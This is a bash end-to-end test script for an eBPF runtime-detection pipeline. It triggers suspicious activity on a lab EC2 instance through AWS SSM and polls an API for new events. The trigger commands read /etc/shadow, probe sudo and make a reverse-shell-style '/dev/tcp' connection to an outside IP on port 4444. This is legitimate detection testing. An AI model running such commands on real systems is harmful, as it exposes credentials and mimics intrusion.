#!/usr/bin/env bash
# End-to-end test of the continuous eBPF pipeline:
#   trigger a detection on the EC2 -> sensor -> S3 shipper -> local collector -> API
# Fires benign-but-suspicious activity on the instance, then polls the API until
# the runtime-event count for the node climbs (or times out). PASS/FAIL + hints.
#
# Usage:
#   scripts/test_continuous.sh [instance-id] [node] [region] [api-url]
# Defaults target the lab.
#
# LAB ONLY: the triggered activity reads /etc/shadow and attempts outbound
# connects to documentation IPs to exercise the classifiers. Do not run against
# production hosts.
set -euo pipefail

INSTANCE="${1:-i-0bc1b63d0cf3206a3}"
NODE="${2:-lab-ec2}"
REGION="${3:-us-east-1}"
API="${4:-http://localhost:8000}"
DEADLINE=150   # seconds to wait (shipper 60s + collector 30s + slack)

SUMMARY_URL="$API/api/inventory/runtime-events/summary"

# Total runtime-event count — uncapped + monotonic (append-only store), so it
# is the reliable growth signal. (A node-filtered list is capped by limit= and
# saturates, so it cannot detect growth once the cap is hit.)
total_count() {
  curl -s -m 5 "$SUMMARY_URL" | python3 -c "
import sys, json
try: print(json.load(sys.stdin).get('total', 'ERR'))
except Exception: print('ERR')
" 2>/dev/null
}

crit_count() {
  curl -s -m 5 "$SUMMARY_URL" | python3 -c "
import sys, json
try: print(json.load(sys.stdin).get('by_severity', {}).get('critical', 0))
except Exception: print('ERR')
" 2>/dev/null
}

fail() { echo; echo "RESULT: FAIL — $1"; hints; exit 1; }

hints() {
  echo
  echo "diagnose per stage:"
  echo "  sensor : aws ssm send-command --region $REGION --instance-ids $INSTANCE --document-name AWS-RunShellScript --parameters 'commands=[\"systemctl is-active cloudsentinel-sensor\"]'"
  echo "  shipper: aws s3 ls s3://<bucket>/ebpf/$NODE/ --region $REGION"
  echo "  collect: systemctl --user is-active cloudsentinel-collector ; journalctl --user -u cloudsentinel-collector -n 20"
  echo "  api    : curl -s $SUMMARY_URL"
}

echo "== continuous eBPF pipeline test =="
echo "instance=$INSTANCE node=$NODE region=$REGION api=$API"

# 0. preflight: API reachable
curl -s -m 5 "$SUMMARY_URL" >/dev/null 2>&1 || fail "API unreachable at $API (is it running?)"

BEFORE=$(total_count); CBEFORE=$(crit_count)
[ "$BEFORE" = "ERR" ] && fail "could not read API summary"
echo "baseline: $BEFORE total runtime events, $CBEFORE critical"

# 1. fire a detection burst on the instance (sensitive file + privesc + revshell)
echo "firing activity on $INSTANCE …"
CID=$(aws ssm send-command --region "$REGION" --instance-ids "$INSTANCE" \
  --document-name AWS-RunShellScript --timeout-seconds 60 \
  --parameters 'commands=["cat /etc/shadow >/dev/null 2>&1","bash -c '"'"'cat /etc/shadow >/dev/null 2>&1; sudo -n id >/dev/null 2>&1'"'"'","sudo -n true 2>/dev/null","timeout 2 bash -c '"'"'cat </dev/tcp/45.33.32.156/4444'"'"' 2>/dev/null","echo fired"]' \
  --query 'Command.CommandId' --output text 2>&1) || fail "SSM send-command failed (creds? instance SSM-managed?)"
echo "ssm command: $CID"

# 2. poll API until the node's event count climbs
echo "waiting up to ${DEADLINE}s for events to flow (shipper 60s + collector 30s) …"
START=$(date +%s)
while :; do
  sleep 10
  NOW=$(total_count)
  EL=$(( $(date +%s) - START ))
  echo "  +${EL}s: total events=$NOW (baseline $BEFORE)"
  if [ "$NOW" != "ERR" ] && [ "$NOW" -gt "$BEFORE" ]; then
    CAFTER=$(crit_count)
    echo
    echo "RESULT: PASS — $((NOW - BEFORE)) new event(s) reached the API via the pipeline."
    echo "  critical total: $CBEFORE -> $CAFTER"
    echo "  view: http://localhost:5173/threats  (Process tree, node=$NODE)"
    exit 0
  fi
  [ "$EL" -ge "$DEADLINE" ] && fail "no new events within ${DEADLINE}s"
done
